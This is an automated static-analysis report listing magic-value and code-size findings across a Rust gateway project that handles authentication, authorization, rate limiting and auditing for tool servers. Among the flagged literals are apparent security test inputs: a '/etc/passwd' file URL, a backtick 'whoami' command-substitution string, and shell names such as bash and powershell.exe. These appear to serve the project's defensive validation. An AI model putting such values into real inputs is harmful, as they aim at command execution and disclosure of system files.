#### Magic value '"ftp://example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1538

---

#### Magic value '"file:///etc/passwd"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1539

---

#### Magic value '"`whoami`"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1556

---

#### Magic value '"bash"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1560

---

#### Magic value '"powershell.exe"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1562

---

#### Magic value '"tools/list"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/transport/mod.rs`
- **Line:** 1582

---

#### Magic value '"{0}"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/lib.rs`
- **Line:** 52

---

#### Magic value '"any_tool"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 155

---

#### Magic value '"read"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 169

---

#### Magic value '"list"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 170

---

#### Magic value '"write"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 171

---

#### Magic value '"any_tool"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 185

---

#### Magic value '"tools"' used as array index (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 239

---

#### Magic value '"tools"' used as array index (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 271

---

#### Magic value '"name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 273

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 273

---

#### Magic value '"tools"' used as array index (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 302

---

#### Magic value '"tools"' used as array index (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 333

---

#### Magic value '"name"' used as array index (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 337

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 339

---

#### Magic value '"list_files"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 340

---

#### Magic value '"write_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 341

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 356

---

#### Magic value '"delete_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/authz/mod.rs`
- **Line:** 434

---

#### Large class 'AuditLogger' detected: 0 LOC, 12 methods, 4 fields

- **File:** `src/audit/mod.rs`
- **Line:** 447

**Recommendation:** Consider breaking this class into smaller, more focused classes

---

#### Magic value '"snake_case"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 326

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1013

---

#### Magic value '"super_secret_123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1074

---

#### Magic value '"xyz123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1094

---

#### Magic value '"abc456"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1095

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1139

---

#### Magic value '"bearer"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1142

---

#### Magic value '20' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1203

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1262

---

#### Magic value '"user123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1302

---

#### Magic value '"user1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1318

---

#### Magic value '"tools/call"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1319

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1320

---

#### Magic value '150' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1323

---

#### Magic value '"auth_failure"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1335

---

#### Magic value '"user1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1336

---

#### Magic value '"\"success\":false"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1338

---

#### Magic value '"user1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1344

---

#### Magic value '"user2"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1345

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1345

---

#### Magic value '"user1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1357

---

#### Magic value '"user2"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1358

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1359

---

#### Magic value '"mcp-guard-audit.log"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1394

---

#### Magic value '"auth_success"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1401

---

#### Magic value '"auth_failure"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1402

---

#### Magic value '"tool_call"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1403

---

#### Magic value '"tool_response"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1404

---

#### Magic value '"rate_limited"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1405

---

#### Magic value '"authz_denied"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1406

---

#### Magic value '"file_test_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1471

---

#### Magic value '"auth_success"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1472

---

#### Magic value '30' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/audit/mod.rs`
- **Line:** 1505

---

#### Magic value '"Authorization"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/audit/mod.rs`
- **Line:** 1522

---

#### Large class 'ServerRouter' detected: 0 LOC, 15 methods, 2 fields

- **File:** `src/router/mod.rs`
- **Line:** 34

**Recommendation:** Consider breaking this class into smaller, more focused classes

---

#### Magic value '"github"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 271

---

#### Magic value '"filesystem"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 272

---

#### Magic value '"github"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 276

---

#### Magic value '"filesystem"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 277

---

#### Magic value '"root"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 321

---

#### Magic value '"root"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 329

---

#### Magic value '"exact"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 335

---

#### Magic value '"exact"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 339

---

#### Magic value '"exact"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 340

---

#### Magic value '"exact"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 342

---

#### Magic value '"server1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 362

---

#### Magic value '"default"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 560

---

#### Magic value '"github"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 570

---

#### Magic value '"github"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/router/mod.rs`
- **Line:** 577

---

#### Large class 'RateLimitService' detected: 0 LOC, 16 methods, 7 fields

- **File:** `src/rate_limit/mod.rs`
- **Line:** 96

**Recommendation:** Consider breaking this class into smaller, more focused classes

---

#### Magic value '"user_a"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 492

---

#### Magic value '"user_a"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 493

---

#### Magic value '"user_b"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 496

---

#### Magic value '"user_b"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 497

---

#### Magic value '"default_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 510

---

#### Magic value '"default_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 511

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 515

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 516

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 517

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 518

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 519

---

#### Magic value '"vip_user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 522

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 532

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 533

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 540

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 550

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 551

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 620

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 620

---

#### Magic value '"execute_*"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 632

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 640

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 640

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 651

---

#### Magic value '"execute_*"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 687

---

#### Magic value '"write_*"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 692

---

#### Magic value '"user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 716

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 716

---

#### Magic value '"execute_*"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 727

---

#### Magic value '"user_a"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 735

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 735

---

#### Magic value '"user_a"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 736

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 736

---

#### Magic value '"user_b"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 739

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 739

---

#### Magic value '"user_b"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 740

---

#### Magic value '"execute_code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 740

---

#### Magic value '"execute_*"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/rate_limit/mod.rs`
- **Line:** 754

---

#### Magic value '"success"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 227

---

#### Magic value '"failure"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 227

---

#### Magic value '"success"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/observability/mod.rs`
- **Line:** 263

---

#### Magic value '0.1' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 309

---

#### Magic value '0.5' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 422

---

#### Magic value '0.5' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 425

---

#### Magic value '0.1' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/observability/mod.rs`
- **Line:** 434

---

#### Magic value '"mock"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/mocks.rs`
- **Line:** 88

---

#### Magic value '"mock"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/mocks.rs`
- **Line:** 152

---

#### Magic value '"test/method"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/mocks.rs`
- **Line:** 179

---

#### Magic value '"oauth"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 467

---

#### Magic value '"read:user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 485

---

#### Magic value '"oauth"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 496

---

#### Magic value '"response_type=code"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 520

---

#### Magic value '"client_id=test-client-id"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 521

---

#### Magic value '"state=test-state"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 522

---

#### Magic value '"code_challenge=test-challenge"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 531

---

#### Magic value '"code_challenge_method=S256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 532

---

#### Magic value '"active"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 562

---

#### Magic value '"user123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 563

---

#### Magic value '"username"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 564

---

#### Magic value '"testuser"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 564

---

#### Magic value '"scope"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 565

---

#### Magic value '"user123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 570

---

#### Magic value '"testuser"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 571

---

#### Magic value '"read:user"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 572

---

#### Magic value '"repo"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 572

---

#### Magic value '12345' found in code (low). Consider extracting this magic number into a named constant with a descriptive name.

- **File:** `src/auth/oauth.rs`
- **Line:** 581

---

#### Magic value '"login"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 582

---

#### Magic value '"octocat"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 582

---

#### Magic value '"name"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 583

---

#### Magic value '"12345"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 587

---

#### Magic value '"active"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 597

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 616

---

#### Magic value '"write_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/oauth.rs`
- **Line:** 617

---

#### Magic value '"mtls"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 262

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 367

---

#### Magic value '"mtls"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 373

---

#### Magic value '"10.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 388

---

#### Magic value '"192.168.1.100"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 389

---

#### Magic value '"10.0.0.2"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 390

---

#### Magic value '"8.8.8.8"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 391

---

#### Magic value '"10.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 402

---

#### Magic value '"10.255.255.255"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 403

---

#### Magic value '"192.168.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 406

---

#### Magic value '"192.168.255.255"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 407

---

#### Magic value '"11.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 410

---

#### Magic value '"192.169.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 411

---

#### Magic value '"10.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 420

---

#### Magic value '"8.8.8.8"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 421

---

#### Magic value '"fd00::1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 432

---

#### Magic value '"fe80::1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 433

---

#### Magic value '"10.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 443

---

#### Magic value '"10.0.0.1"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 465

---

#### Magic value '"client.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 519

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 535

---

#### Magic value '"client.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 543

---

#### Magic value '"client.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 549

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 550

---

#### Magic value '"client.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 567

---

#### Magic value '"service.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 590

---

#### Magic value '"api.example.com"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mtls.rs`
- **Line:** 591

---

#### Magic value '"api_key"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 215

---

#### Magic value '"multi"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 271

---

#### Magic value '"abc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 281

---

#### Magic value '"abc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 282

---

#### Magic value '"abc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 288

---

#### Magic value '"abc123XYy"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 289

---

#### Magic value '"abc123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 295

---

#### Magic value '"abc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 296

---

#### Magic value '"Xbc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 309

---

#### Magic value '"abc123XYZ"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 310

---

#### Magic value '"read"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 322

---

#### Magic value '"read"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/mod.rs`
- **Line:** 332

---

#### Long method 'refresh_jwks' detected: 56 lines, 96 statements, complexity 9

- **File:** `src/auth/jwt.rs`
- **Line:** 135

**Code:**
```
async fn refresh_jwks(&self) -> Result<(), AuthError> {
        let JwtMode::Jwks { jwks_url, algorithms, cache_duration_secs, .. } = &self.config.mode else {
            return Err(AuthError::Internal("Not in JWKS mode".into()));
        };

...
```

**Recommendation:** Consider breaking down 'refresh_jwks' into smaller, more focused methods. Current metrics: LOC=56, Statements=96, Complexity=9, Nesting=8

---

#### Long method 'refresh_jwks' detected: 56 lines, 96 statements, complexity 9

- **File:** `src/auth/jwt.rs`
- **Line:** 135

**Code:**
```
async fn refresh_jwks(&self) -> Result<(), AuthError> {
        let JwtMode::Jwks { jwks_url, algorithms, cache_duration_secs, .. } = &self.config.mode else {
            return Err(AuthError::Internal("Not in JWKS mode".into()));
        };

...
```

**Recommendation:** Consider breaking down 'refresh_jwks' into smaller, more focused methods. Current metrics: LOC=56, Statements=96, Complexity=9, Nesting=8

---

#### Magic value '"HS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 371

---

#### Magic value '"HS384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 372

---

#### Magic value '"HS512"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 373

---

#### Magic value '"RS256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 374

---

#### Magic value '"RS384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 375

---

#### Magic value '"RS512"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 376

---

#### Magic value '"ES256"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 377

---

#### Magic value '"ES384"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 378

---

#### Magic value '"user123"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 436

---

#### Magic value '"read_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

- **File:** `src/auth/jwt.rs`
- **Line:** 561

---

#### Magic value '"write_file"' found in code (low). Consider extracting this magic string into a named constant to improve maintainability.

